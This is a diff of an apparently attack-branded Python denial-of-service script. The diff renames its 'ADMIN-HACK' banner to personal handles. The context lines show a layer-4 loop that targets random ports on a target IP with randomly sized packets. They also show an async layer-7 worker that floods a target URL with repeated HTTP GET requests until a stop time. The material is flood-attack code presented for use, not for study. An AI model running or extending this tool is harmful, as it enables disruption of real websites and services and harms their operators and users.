@@ -63,8 +63,8 @@ def layer4_attack(target_ip, duration):
     while time.time() - start_time < duration:
         port = random.randint(20, 65535)
         psize = random.randint(64, 1500)
-        print(Fore.WHITE + f"[L4] \033[100m{Fore.WHITE}ADMIN-HACK\033[0m {Fore.BLUE} SEN-PACKET {Fore.GREEN} {psize} {Fore.RED} BYTES TO {Fore.YELLOW}{target_ip}{Fore.CYAN}:{port} {Fore.WHITE}Running")
-        print(Fore.RED + f"[L4] {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {psize} {Fore.MAGENTA} BYTES TO \033[104m{Fore.WHITE}{target_ip}:{port}\033[0m {Fore.GREEN}Running")
+        print(Fore.WHITE + f"[L4] \033[100m{Fore.WHITE}W A R T O K\033[0m {Fore.BLUE} SEN-PACKET {Fore.GREEN} {psize} {Fore.RED} BYTES TO {Fore.YELLOW}{target_ip}{Fore.CYAN}:{port} {Fore.WHITE}Running")
+        print(Fore.RED + f"[L4] {Fore.YELLOW}W A R T O K {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {psize} {Fore.MAGENTA} BYTES TO \033[104m{Fore.WHITE}{target_ip}:{port}\033[0m {Fore.GREEN}Running")
         time.sleep(0.2)
     print(Fore.GREEN + "\n[✔] Layer 4 attack finished!\n")
 
@@ -78,8 +78,8 @@ async def worker(session, url, stop_time):
             async with session.get(url) as resp:
                 await resp.text()
                 hits += 1
-                print(Fore.RED + f"[L7] {Fore.BLUE}  \033[103mADMIN-HACK\033[0m {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
-                print(Fore.WHITE + f"[L7] {Fore.YELLOW}  ADMIN-HACK {Fore.BLUE}REQUEST-SENT \033[104m{Fore.YELLOW}{url}\033[0m {Fore.GREEN}Running :")
+                print(Fore.RED + f"[L7] {Fore.BLUE}  \033[103mS A L M A N\033[0m {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
+                print(Fore.WHITE + f"[L7] {Fore.YELLOW}  S A L M A N {Fore.BLUE}REQUEST-SENT \033[104m{Fore.YELLOW}{url}\033[0m {Fore.GREEN}Running :")
         except:
             print(Fore.RED + f"[L7] Request failed -> {url} 🇵🇸")
     return hits
